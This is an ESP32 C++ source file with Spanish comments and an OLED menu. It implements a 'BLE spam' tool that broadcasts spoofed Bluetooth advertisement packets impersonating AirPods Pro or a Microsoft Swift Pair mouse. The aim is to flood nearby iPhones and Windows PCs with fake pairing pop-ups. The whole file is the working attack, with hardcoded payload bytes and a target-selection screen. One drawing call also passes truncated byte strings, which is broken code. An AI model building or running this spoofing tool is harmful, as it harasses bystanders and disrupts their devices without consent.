#include "ble_spam.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <U8g2lib.h>
#include <WiFi.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern bool runningApp;

// --- PAYLOADS ---
// AirPods Pro (Apple)
uint8_t apple_packet[] = { 0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12 };

// Windows Swift Pair (Aparece como "Mouse Bluetooth")
uint8_t windows_packet[] = { 0x1e, 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

static bool bleInitialized = false;
static int spamMode = 0; // 0: Selección, 1: Apple, 2: Windows
static BLEAdvertising *pAdvertising = nullptr;

void bleSpamLoop() {
    // 1. MENU DE SELECCIÓN (Si no hay modo activo)
    if (spamMode == 0) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x12_tr);
        u8g2.drawStr(10, 15, "--- SELECT TARGET ---");
        u8g2.drawStr(20, 35, "> UP: APPLE iOS");
        u8g2.drawStr(20, 50, "> DW: WINDOWS 10/11");
        u8g2.drawStr(10, 63, "BACK para salir");
        u8g2.sendBuffer();

        if (digitalRead(26) == LOW) { spamMode = 1; delay(200); } // UP -> Apple
        if (digitalRead(33) == LOW) { spamMode = 2; delay(200); } // DOWN -> Windows
        if (digitalRead(25) == LOW) { runningApp = false; delay(200); }
        return;
    }

    // 2. INICIALIZACIÓN DEL MODO ELEGIDO
    if (!bleInitialized) {
        WiFi.mode(WIFI_OFF);
        BLEDevice::init(spamMode == 1 ? "AirPods Pro" : "Microsoft Mouse");
        pAdvertising = BLEDevice::getAdvertising();
        
        BLEAdvertisementData oAdvertisementData;
        if (spamMode == 1) 
            oAdvertisementData.addData((char*)apple_packet, sizeof(apple_packet));
        else 
            oAdvertisementData.addData((char*)windows_packet, sizeof(windows_packet));

        pAdvertising->setAdvertisementData(oAdvertisementData);
        pAdvertising->start();
        bleInitialized = true;
    }

    // 3. INTERFAZ DE ATAQUE
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(5, 12, spamMode == 1 ? "BLE SPAM: APPLE" : "BLE SPAM: WINDOWS");
    u8g2.drawHLine(0, 15, 128);
    
    u8g2.setCursor(5, 40);
    u8g2.print("Status: RUNNING...");
    
    static int anim = 0;
    u8g2.drawXBM(100, 30, 16, 16, (anim++ % 2 == 0) ? (const uint8_t*)"\x00\x00..." : (const uint8_t*)"\xFF\xFF..."); // Un parpadeo simple
    
    u8g2.drawStr(5, 60, "[BACK] para detener");
    u8g2.sendBuffer();

    // 4. SALIDA Y RESET
    if (digitalRead(25) == LOW) {
        if (pAdvertising) pAdvertising->stop();
        spamMode = 0; // Volver al submenú de selección
        bleInitialized = false; // Permitir re-inicializar con otro nombre/packet
        delay(300);
    }
}